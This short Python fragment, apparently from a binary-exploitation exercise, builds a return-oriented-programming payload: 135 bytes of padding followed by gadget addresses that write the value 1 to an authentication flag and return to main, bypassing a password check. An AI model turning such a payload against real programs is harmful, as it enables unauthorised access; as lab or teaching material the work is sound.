...
def get_arg() -> bytes:
    ...
    # addresses for the rop
    pop_eax = search.find('POP EAX')
    pop_edx = search.find('POP EDX')
    mov_addr = search.find('MOV [EAX], EDX')
    # return back to main after check_password
    ret_addr = addresses.RET_MAIN

    offset = ('a'*135).encode('latin-1')
    
    password = offset + struct.pack('<IIIIII', pop_eax, addresses.AUTH, pop_edx, 0x1, mov_addr, ret_addr)
